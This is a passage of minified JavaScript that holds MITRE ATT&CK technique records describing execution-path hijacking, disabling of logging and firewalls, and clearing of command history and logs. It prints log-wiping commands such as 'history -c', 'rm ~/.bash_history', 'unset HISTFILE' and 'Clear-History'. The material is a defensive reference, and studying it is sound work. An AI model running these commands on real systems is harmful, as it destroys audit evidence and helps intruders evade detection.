href='https:\u002F\u002Fwww.mozilla.org\u002Fen-US\u002Fsecurity\u002Fadvisories\u002Fmfsa2012-98\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fseclists.org\u002Ffulldisclosure\u002F2015\u002FDec\u002F34'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.";vp.external_references=[{source_name:b,external_id:vq,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F005"},{source_name:"mozilla_sec_adv_2012",url:"https:\u002F\u002Fwww.mozilla.org\u002Fen-US\u002Fsecurity\u002Fadvisories\u002Fmfsa2012-98\u002F",description:"Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017."},{source_name:"Executable Installers are Vulnerable",url:"https:\u002F\u002Fseclists.org\u002Ffulldisclosure\u002F2015\u002FDec\u002F34",description:"Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014."}];vp["subtechnique-of"]=F;vr.id=vs;vr["object-type"]=a;vr.name="Path Interception by PATH Environment Variable";vr.description="Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\n\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, \u003Ccode\u003E%SystemRoot%\\system32\u003C\u002Fcode\u003E (e.g., \u003Ccode\u003EC:\\Windows\\system32\u003C\u002Fcode\u003E), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if \u003Ccode\u003EC:\\example path\u003C\u002Fcode\u003E precedes \u003C\u002Fcode\u003EC:\\Windows\\system32\u003C\u002Fcode\u003E is in the PATH environment variable, a program that is named net.exe and placed in \u003Ccode\u003EC:\\example path\u003C\u002Fcode\u003E will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.";vr.external_references=[{source_name:b,external_id:vs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F007"},{external_id:fI,source_name:c,url:fJ},{external_id:vt,source_name:c,url:vu}];vr["subtechnique-of"]=F;vv.id=vw;vv["object-type"]=a;vv.name="Path Interception by Search Order Hijacking";vv.description="Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F001'\u003EDLL Search Order Hijacking\u003C\u002Fa\u003E, the search order differs depending on the method that is used to execute the program. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms682425'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002F\u002Fcc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms687393'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument \u003Ccode\u003Enet user\u003C\u002Fcode\u003E. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then \u003Ccode\u003Ecmd.exe \u002FC net user\u003C\u002Fcode\u003E will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002F\u002Ffd7hxfdd(v=vs.85)?redirectedfrom=MSDN'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F001'\u003EDLL Search Order Hijacking\u003C\u002Fa\u003E.";vv.external_references=[{source_name:b,external_id:vw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F008"},{external_id:vx,source_name:c,url:vy},{url:fK,description:fL,source_name:fM},{source_name:"Windows NT Command Shell",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002F\u002Fcc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120",description:"Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014."},{url:vz,description:vA,source_name:vB},{source_name:"Microsoft Environment Property",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002F\u002Ffd7hxfdd(v=vs.85)?redirectedfrom=MSDN",description:"Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016."}];vv["subtechnique-of"]=F;vC.id=vD;vC["object-type"]=a;vC.name="Path Interception by Unquoted Path";vC.description="Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Fhklm-system-currentcontrolset-services-registry-tree'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., \u003Ccode\u003EC:\\unsafe path with space\\program.exe\u003C\u002Fcode\u003E vs. \u003Ccode\u003E\"C:\\safe path with space\\program.exe\"\u003C\u002Fcode\u003E). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002FHelp+eliminate+unquoted+path+vulnerabilities\u002F14464'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is \u003Ccode\u003EC:\\program files\\myapp.exe\u003C\u002Fcode\u003E, an adversary may create a program at \u003Ccode\u003EC:\\program.exe\u003C\u002Fcode\u003E that will be run instead of the intended program. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurityboulevard.com\u002F2018\u002F04\u002Fwindows-privilege-escalation-unquoted-services\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.absolomb.com\u002F2018-01-26-Windows-Privilege-Escalation-Guide\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.";vC.external_references=[{source_name:b,external_id:vD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F009"},{external_id:vt,source_name:c,url:vu},{source_name:"Microsoft CurrentControlSet Services",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Fhklm-system-currentcontrolset-services-registry-tree",description:"Microsoft. (2017, April 20). HKLM\\SYSTEM\\CurrentControlSet\\Services Registry Tree. Retrieved March 16, 2020."},{source_name:"Help eliminate unquoted path",url:vE,description:"Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012."},{source_name:"Windows Unquoted Services",url:vF,description:vG},{source_name:"Windows Privilege Escalation Guide",url:"https:\u002F\u002Fwww.absolomb.com\u002F2018-01-26-Windows-Privilege-Escalation-Guide\u002F",description:"absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018."}];vC["subtechnique-of"]=F;vH.id=vI;vH["object-type"]=a;vH.name="Services File Permissions Weakness";vH.description="Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.";vH.external_references=[{source_name:b,external_id:vI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F010"},{external_id:"CAPEC-17",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F17.html"}];vH["subtechnique-of"]=F;vJ.id=vK;vJ["object-type"]=a;vJ.name="Services Registry Permissions Weakness";vJ.description="Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under \u003Ccode\u003EHKLM\\SYSTEM\\CurrentControlSet\\Services\u003C\u002Fcode\u003E. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E, or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E. Access to Registry keys is controlled through Access Control Lists and permissions. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fsysinfo\u002Fregistry-key-security-and-access-rights?redirectedfrom=MSDN'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath\u002FImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and\u002For privilege escalation to the account context the service is set to execute under (local\u002Fdomain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as \u003Ccode\u003EFailureCommand\u003C\u002Fcode\u003E) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftrustedsignal.blogspot.com\u002F2014\u002F05\u002Fkansa-service-related-collectors-and.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftwitter.com\u002Fr0wdy_\u002Fstatus\u002F936365549553991680'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";vJ.external_references=[{source_name:b,external_id:vK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F011"},{external_id:nP,source_name:c,url:nQ},{source_name:"Registry Key Security",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fsysinfo\u002Fregistry-key-security-and-access-rights?redirectedfrom=MSDN",description:"Microsoft. (2018, May 31). Registry Key Security and Access Rights. Retrieved March 16, 2017."},{source_name:"Kansa Service related collectors",url:"https:\u002F\u002Ftrustedsignal.blogspot.com\u002F2014\u002F05\u002Fkansa-service-related-collectors-and.html",description:"Hull, D.. (2014, May 3). Kansa: Service related collectors and analysis. Retrieved October 10, 2019."},{source_name:"Tweet Registry Perms Weakness",url:"https:\u002F\u002Ftwitter.com\u002Fr0wdy_\u002Fstatus\u002F936365549553991680",description:"@r0wdy_. (2017, November 30). Service Recovery Parameters. Retrieved April 9, 2018."},{source_name:uX,url:uY,description:uZ}];vJ["subtechnique-of"]=F;vM.id=vN;vM["object-type"]=a;vM.name="Disable Cloud Logs";vM.description="An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. \n\nCloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an attacker has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch\u002FCloudTrail integrations prior to conducting further malicious activity.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fexpel.io\u002Fblog\u002Ffollowing-cloudtrail-generating-aws-security-signals-sumo-logic\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";vM.external_references=[{source_name:b,external_id:vN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F008"},{source_name:"Following the CloudTrail: Generating strong AWS security signals with Sumo Logic",url:"https:\u002F\u002Fexpel.io\u002Fblog\u002Ffollowing-cloudtrail-generating-aws-security-signals-sumo-logic\u002F",description:"Dan Whalen. (2019, September 10). Following the CloudTrail: Generating strong AWS security signals with Sumo Logic. Retrieved October 16, 2020."},{source_name:"Stopping CloudTrail from Sending Events to CloudWatch Logs",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002Fawscloudtrail\u002Flatest\u002Fuserguide\u002Fstop-cloudtrail-from-sending-events-to-cloudwatch-logs.html",description:"Amazon Web Services. (n.d.). Stopping CloudTrail from Sending Events to CloudWatch Logs. Retrieved October 16, 2020."},{source_name:"Configuring Data Access audit logs",url:"https:\u002F\u002Fcloud.google.com\u002Flogging\u002Fdocs\u002Faudit\u002Fconfigure-data-access",description:"Google. (n.d.). Configuring Data Access audit logs. Retrieved October 16, 2020."},{source_name:"az monitor diagnostic-settings",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fcli\u002Fazure\u002Fmonitor\u002Fdiagnostic-settings?view=azure-cli-latest#az_monitor_diagnostic_settings_delete",description:"Microsoft. (n.d.). az monitor diagnostic-settings. Retrieved October 16, 2020."}];vM["subtechnique-of"]=V;vO.id=vP;vO["object-type"]=a;vO.name="Disable Windows Event Logging";vO.description="Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ultimatewindowssecurity.com\u002Fsecuritylog\u002Fencyclopedia\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This data is used by security tools and analysts to generate detections.\n\nAdversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.";vO.external_references=[{source_name:b,external_id:vP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F002"},{source_name:"Windows Log Events",url:"https:\u002F\u002Fwww.ultimatewindowssecurity.com\u002Fsecuritylog\u002Fencyclopedia\u002F",description:"Franklin Smith. (n.d.). Windows Security Log Events. Retrieved February 21, 2020."}];vO["subtechnique-of"]=V;vQ.id=vR;vQ["object-type"]=a;vQ.name="Disable or Modify Cloud Firewall";vQ.description="Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F004'\u003EDisable or Modify System Firewall\u003C\u002Fa\u003E. \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP\u002FIP connectivity.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fexpel.io\u002Fblog\u002Ffinding-evil-in-aws\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and\u002For data exfiltration that would otherwise not be allowed.";vQ.external_references=[{source_name:b,external_id:vR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F007"},{source_name:ci,url:cj,description:ck}];vQ["subtechnique-of"]=V;vS.id=vT;vS["object-type"]=a;vS.name="Disable or Modify System Firewall";vS.description="Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and\u002For data exfiltration that would otherwise not be allowed. ";vS.external_references=[{source_name:b,external_id:vT,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F004"}];vS["subtechnique-of"]=V;vU.id=vV;vU["object-type"]=a;vU.name="Disable or Modify Tools";vU.description="Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.";vU.external_references=[{source_name:b,external_id:vV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F001"},{external_id:"CAPEC-578",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F578.html"}];vU["subtechnique-of"]=V;vW.id=vX;vW["object-type"]=a;vW.name="Impair Command History Logging";vW.description="Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable \u003Ccode\u003EHISTFILE\u003C\u002Fcode\u003E. When a user logs off a system, this information is flushed to a file in the user's home directory called \u003Ccode\u003E~\u002F.bash_history\u003C\u002Fcode\u003E. The \u003Ccode\u003EHISTCONTROL\u003C\u002Fcode\u003E environment variable keeps track of what should be saved by the \u003Ccode\u003Ehistory\u003C\u002Fcode\u003E command and eventually into the \u003Ccode\u003E~\u002F.bash_history\u003C\u002Fcode\u003E file when a user logs out. \u003Ccode\u003EHISTCONTROL\u003C\u002Fcode\u003E does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (\u003Ccode\u003Eunset HISTFILE\u003C\u002Fcode\u003E) or set the command history size to zero (\u003Ccode\u003Eexport HISTFILESIZE=0\u003C\u002Fcode\u003E) to prevent logging of commands. Additionally, \u003Ccode\u003EHISTCONTROL\u003C\u002Fcode\u003E can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". \u003Ccode\u003EHISTCONTROL\u003C\u002Fcode\u003E can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.\n\nOn Windows systems, the \u003Ccode\u003EPSReadLine\u003C\u002Fcode\u003E module tracks commands used in all PowerShell sessions and writes them to a file (\u003Ccode\u003E$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\u003C\u002Fcode\u003E by default). Adversaries may change where these logs are saved using \u003Ccode\u003ESet-PSReadLineOption -HistorySavePath {File Path}\u003C\u002Fcode\u003E. This will cause \u003Ccode\u003EConsoleHost_history.txt\u003C\u002Fcode\u003E to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command \u003Ccode\u003ESet-PSReadlineOption -HistorySaveStyle SaveNothing\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmicrosoft.powershell.core\u002Fabout\u002Fabout_history?view=powershell-7'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.sophos.com\u002Fproducts\u002Fintercept\u002Fearly-access-program\u002Ff\u002Flive-discover-response-queries\u002F121529\u002Flive-discover---powershell-command-audit'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.sophos.com\u002Fproducts\u002Fmalware\u002Fb\u002Fblog\u002Fposts\u002Fpowershell-command-history-forensics'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";vW.external_references=[{source_name:b,external_id:vX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F003"},{external_id:fI,source_name:c,url:fJ},{source_name:vY,url:vZ,description:v_},{source_name:v$,url:wa,description:wb},{source_name:wc,url:wd,description:we}];vW["subtechnique-of"]=V;wf.id=wg;wf["object-type"]=a;wf.name="Indicator Blocking";wf.description="An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Fen-us\u002Fwdsi\u002Fthreats\u002Fmalware-encyclopedia-description?name=Backdoor:Win32\u002FLamin.A'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or even disabling host-based sensors, such as Event Tracing for Windows (ETW),\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fdesktop\u002Fetw\u002Fconsuming-events'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E by tampering settings that control the collection and flow of event telemetry. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002Fpalantir\u002Ftampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These settings may be stored on the system in configuration files and\u002For in the Registry as well as being accessible via administrative utilities such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047'\u003EWindows Management Instrumentation\u003C\u002Fa\u003E.\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E \u003Ccode\u003ESet-EtwTraceProvider\u003C\u002Fcode\u003E cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and\u002For creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ";wf.external_references=[{source_name:b,external_id:wg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562\u002F006"},{external_id:"CAPEC-571",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F571.html"},{url:"https:\u002F\u002Fwww.microsoft.com\u002Fen-us\u002Fwdsi\u002Fthreats\u002Fmalware-encyclopedia-description?name=Backdoor:Win32\u002FLamin.A",description:"Microsoft. (2009, May 17). Backdoor:Win32\u002FLamin.A. Retrieved September 6, 2018.",source_name:"Microsoft Lamin Sept 2017"},{source_name:"Microsoft About Event Tracing 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fdesktop\u002Fetw\u002Fconsuming-events",description:"Microsoft. (2018, May 30). About Event Tracing. Retrieved June 7, 2019."},{source_name:"Medium Event Tracing Tampering 2018",url:"https:\u002F\u002Fmedium.com\u002Fpalantir\u002Ftampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63",description:"Palantir. (2018, December 24). Tampering with Windows Event Tracing: Background, Offense, and Defense. Retrieved June 7, 2019."}];wf["subtechnique-of"]=V;wi.id=wj;wi["object-type"]=a;wi.name="Clear Command History";wi.description="In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable \u003Ccode\u003EHISTFILE\u003C\u002Fcode\u003E. When a user logs off a system, this information is flushed to a file in the user's home directory called \u003Ccode\u003E~\u002F.bash_history\u003C\u002Fcode\u003E. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (\u003Ccode\u003Ehistory -c\u003C\u002Fcode\u003E) or deleting the bash history file \u003Ccode\u003Erm ~\u002F.bash_history\u003C\u002Fcode\u003E.\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the \u003Ccode\u003EPSReadLine\u003C\u002Fcode\u003E module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe \u003Ccode\u003EPSReadLine\u003C\u002Fcode\u003E command history tracks the commands used in all PowerShell sessions and writes them to a file (\u003Ccode\u003E$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\u003C\u002Fcode\u003E by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmicrosoft.powershell.core\u002Fabout\u002Fabout_history?view=powershell-7'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may run the PowerShell command \u003Ccode\u003EClear-History\u003C\u002Fcode\u003E to flush the entire command history from a current PowerShell session. This, however, will not delete\u002Fflush the \u003Ccode\u003EConsoleHost_history.txt\u003C\u002Fcode\u003E file. Adversaries may also delete the \u003Ccode\u003EConsoleHost_history.txt\u003C\u002Fcode\u003E file or edit its contents to hide PowerShell commands they have run.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.sophos.com\u002Fproducts\u002Fintercept\u002Fearly-access-program\u002Ff\u002Flive-discover-response-queries\u002F121529\u002Flive-discover---powershell-command-audit'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.sophos.com\u002Fproducts\u002Fmalware\u002Fb\u002Fblog\u002Fposts\u002Fpowershell-command-history-forensics'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";wi.external_references=[{source_name:b,external_id:wj,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1070\u002F003"},{source_name:vY,url:vZ,description:v_},{source_name:v$,url:wa,description:wb},{source_name:wc,url:wd,description:we}];wi["subtechnique-of"]=$;wk.id=wl;wk["object-type"]=a;wk.name="Clear Linux or Mac System Logs";wk.description="Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the \u003Ccode\u003E\u002Fvar\u002Flog\u002F\u003C\u002Fcode\u003E directory. Subfolders in this directory categorize logs by their related functions, such as:\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.eurovps.com\u002Fblog\u002Fimportant-linux-log-files-you-must-be-monitoring\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n* \u003Ccode\u003E\u002Fvar\u002Flog\u002Fmessages:\u003C\u002Fcode\u003E: General and system-related messages\n* \u003Ccode\u003E\u002Fvar\u002Flog\u002Fsecure\u003C\u002Fcode\u003E or \u003Ccode\u003E\u002Fvar\u002Flog\u002Fauth.log\u003C\u002Fcode\u003E: Authentication logs\n* \u003Ccode\u003E\u002Fvar\u002Flog\u002Futmp\u003C\u002Fcode\u003E or \u003Ccode\u003E\u002Fvar\u002Flog\u002Fwtmp\u003C\u002Fcode\u003E: Login records\n* \u003Ccode\u003E\u002Fvar\u002Flog\u002Fkern.log\u003C\u002Fcode\u003E: Kernel logs\n* \u003Ccode\u003E\u002Fvar\u002Flog\u002Fcron.log\u003C\u002Fcode\u003E: Crond logs\n* \u003Ccode\u003E\u002Fvar\u002Flog\u002Fmaillog\u003C\u002Fcode\u003E: Mail server logs\n* \u003Ccode\u003E\u002Fvar\u002Flog\u002Fhttpd\u002F\u003C\u002Fcode\u003E: Web server access and error logs\n";wk.external_references=[{source_name:b,external_id:wl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1070\u002F002"},{source_name:"Linux Logs",url:"https:\u002F\u002Fwww.eurovps.com\u002Fblog\u002Fimportant-linux-log-files-you-must-be-monitoring\u002F",description:"Marcel. (2018, April 19). 12 Critical Linux Log Files You Must be Monitoring. Retrieved March 29, 2020."}];wk["subtechnique-of"]=$;wm.id=wn;wm["object-type"]=a;wm.name="Clear Windows Event Logs";wm.description="Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* \u003Ccode\u003Ewevtutil cl 